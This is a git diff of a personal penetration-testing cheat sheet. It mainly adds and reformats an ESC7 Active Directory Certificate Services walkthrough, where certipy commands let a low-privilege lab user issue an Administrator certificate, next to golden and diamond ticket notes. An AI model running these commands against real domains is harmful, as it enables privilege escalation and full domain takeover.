@@ -103,6 +103,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [ESC1](#esc1)
 	* [ESC4](#esc4)
 	* [ESC6](#esc6)
+	* [ESC7](#esc7)
 	* [ESC8](#esc8)
 	* [Certifried](#certifried)
 	* [ADCS References](#adcs-references)
@@ -796,6 +797,7 @@ getST.py range.net/ws01\$ -hashes :95e392df668ca6bd103b905856acb8a9 -impersonate
 
 ### Golden Ticket
 A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
+
 | Attribute   | Value                                  |
 | ----------- | -------------------------------------- |
 | Domain      | legitcorp.local                        |
@@ -823,7 +825,8 @@ ticketer.py -domain range.net -aesKey [AESKey] -domain-sid S-1-5-21-1935943001-3
 ```
 
 ### Diamond Ticket
-A diamond ticket is quite different from a [Golden Ticket](#golden-ticket) because golden ticket wouldn't require TGT request since it can be forged offline. Diamond ticket is where we can request a valid user's TGT regardless the level of access on the domain, then the ticket will be modified to allow us to request TGS for a specific service. This is a better technique because normally golden ticket is easier to detect by monitoring for service ticket requests (TGS-REQs) that have no correspokding TGT request (AS-REQ). Detailed steps are as follows:-
+A diamond ticket is quite different from a [Golden Ticket](#golden-ticket) because golden ticket wouldn't require TGT request since it can be forged offline. Diamond ticket is where we can request a valid user's TGT regardless the level of access on the domain, then the ticket will be modified to allow us to request TGS for a specific service. This is a better technique because normally golden ticket is easier to detect by monitoring for service ticket requests (TGS-REQs) that have no correspokding TGT request (AS-REQ). Detailed steps are as follows:
+
 | Attribute           | Value                                                            |
 | ---                 | -----------                                                      |
 | Username & Password | loki:Password123                                                 |
@@ -1264,6 +1267,7 @@ For detailed example, you may refer to this awesome [gist](!https://gist.github.
 ### ESC1
 
 What makes a template vulnerable to ESC1 is when the following requirements are met:
+
 | Attributes                             | Value                             |
 | -------------------------------------- | --------------------------------- |
 | `msPKI-Certificate-Name-Flag`          | `(0x1) ENROLLEE_SUPPLIES_SUBJECT` |
@@ -1385,9 +1389,9 @@ This misconfiguration does not apply on certificate template but Certificate Aut
 certipy find -u 'lowpriv@bionic.local' -p 'Password1234' -dc-ip 10.66.66.3 -stdout -text -enabled -vulnerable
 ```
 
-![[Pasted image 20240317084758.png|lowpriv has Manage CA permission on the CA server]]
+![lowpriv has Manage CA permission on the CA server](./src/images/esc7_ca_vuln.png)
 
-![[Pasted image 20240317084226.png|GUI view of CA security configuration]]
+![GUI view of CA security configuration](./src/images/esc7_gui_ca_vuln.png)
 
 2. We can basically configuration the CA! Now lets enable `Issue and Manage Certificates` on the compromised user `lowpriv`. Use [certipy](https://github.com/ly4k/Certipy) ca submodule with `-add-officer` flag as follows:
 
@@ -1395,7 +1399,7 @@ certipy find -u 'lowpriv@bionic.local' -p 'Password1234' -dc-ip 10.66.66.3 -stdo
 certipy ca -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -add-officer 'lowpriv' -dc-ip 10.66.66.3 -target-ip 10.66.66.3
 ```
 
-![[Pasted image 20240317085357.png|Added extra permission for lowpriv user]]
+![Added extra permission for lowpriv user](./src/images/esc7_add_officer.png)
 
 3. Request **SubCA** certificate. This should throw errors `CERTSRV_E_TEMPLATE_DENIED`, basically saying we don't have permission to request for specified certificate. Please save the private key to be used later on.
 
@@ -1403,7 +1407,7 @@ certipy ca -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -add-off
 certipy req -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -template SubCA -upn 'Administrator@bionic.local' -target 10.66.66.3 -dc-ip 10.66.66.3
 ```
 
-![[Pasted image 20240317085720.png|Certipy throws template denied error]]
+![Certipy throws template denied error](./src/images/esc7_init_req_failed.png)
 
 4. Having `Issue and Manage Certificates` permission enabled. Denied template can easily be issued back. Use [certipy](https://github.com/ly4k/Certipy) ca submodule with `-issue-request` flag with request ID.
 
@@ -1411,7 +1415,7 @@ certipy req -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -templa
 certipy ca -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -dc-ip 10.66.66.3 -target-ip 10.66.66.3 -issue-request 14
 ```
 
-![[Pasted image 20240317085939.png|Certificate issued]]
+![Certificate issued](./src/images/esc7_issue_certificate.png)
 
 5. Retrieve back the denied certificate request. Note that this steps will require the previously saved private key `<request-id>.key`.
 
@@ -1419,7 +1423,7 @@ certipy ca -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -dc-ip 1
 certipy req -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -target 10.66.66.3 -retrieve 14
 ```
 
-![[Pasted image 20240317090223.png|Retrieve the denied certificate request like a boss]]
+![Retrieve the denied certificate request like a boss](./src/images/esc7_retrieve_certificate.png)
 
 6. Proceed with [Pass the Certificate](#pass-the-certificate) attack.
 
